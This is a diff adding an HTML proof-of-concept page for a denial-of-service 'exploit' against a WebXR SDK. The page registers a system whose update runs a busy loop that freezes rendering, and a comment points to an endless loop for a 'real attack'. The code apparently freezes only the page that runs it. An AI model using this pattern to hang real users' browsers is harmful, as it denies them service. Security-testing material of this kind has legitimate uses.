@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Immersive SDK DoS PoC</title>
+    <!--
+      INSTRUCTIONS:
+      1. Build the immersive-web-sdk: `npm install && npm run build`
+      2. Serve this file from the root of the repository.
+    -->
+    <script type="importmap">
+    {
+        "imports": {
+            "three": "https://unpkg.com/three@0.181.0/build/three.module.js",
+            "three/": "https://unpkg.com/three@0.181.0/",
+            "@iwsdk/core": "./packages/core/dist/index.js",
+            "@iwsdk/xr-input": "./packages/xr-input/dist/index.js",
+            "@iwsdk/locomotor": "./packages/locomotor/dist/index.js",
+            "@iwsdk/glxf": "./packages/glxf/dist/index.js",
+            "@pmndrs/uikit": "https://unpkg.com/@pmndrs/uikit@1.0.60/dist/uikit.esm.js",
+            "@pmndrs/uikitml": "https://unpkg.com/@pmndrs/uikitml@0.1.12/dist/uikitml.esm.js",
+            "@pmndrs/pointer-events": "https://unpkg.com/@pmndrs/pointer-events@6.6.22/dist/index.js",
+            "@preact/signals-core": "https://unpkg.com/@preact/signals-core@1.5.0/dist/signals-core.module.js",
+            "three-mesh-bvh": "https://unpkg.com/three-mesh-bvh@0.7.3/build/index.module.js",
+            "yoga-layout": "https://unpkg.com/yoga-layout-prebuilt@1.18.0/yoga-layout-prebuilt.js",
+            "maath/": "https://unpkg.com/maath/",
+            "elics": "https://unpkg.com/elics@3.3.0/dist/elics.js"
+        }
+    }
+    </script>
+    <script type="module">
+        import { createSystem, World } from '@iwsdk/core';
+
+        // DoS System Definition
+        const DoSSystem = createSystem(
+            {}, // No queries needed
+            {}  // No schema needed
+        );
+
+        // Override update to freeze
+        DoSSystem.prototype.update = function() {
+            console.log("DoS System Active - Freezing in 3... 2... 1...");
+            const start = performance.now();
+            // Busy loop for 5 seconds to simulate freeze without killing the browser completely
+            // In a real attack, this would be `while(true){}`
+            while (performance.now() - start < 5000) {
+                // Freeze
+            }
+            console.log("Freeze released (for testing purposes)");
+        };
+
+        async function runExploit() {
+            const container = document.getElementById('scene-container');
+
+            // Initialize World
+            const world = await World.create(container);
+
+            console.log("[*] World created, registering DoS system...");
+
+            // Register the DoS system
+            world.registerSystem(DoSSystem);
+
+            console.log("[*] DoS System registered. Browser should freeze shortly.");
+        }
+
+        document.addEventListener('DOMContentLoaded', runExploit);
+    </script>
+</head>
+<body>
+    <h1>WebXR Render Loop Freeze DoS</h1>
+    <div id="scene-container" style="width: 100%; height: 500px; background: #eee;"></div>
+</body>
+</html>
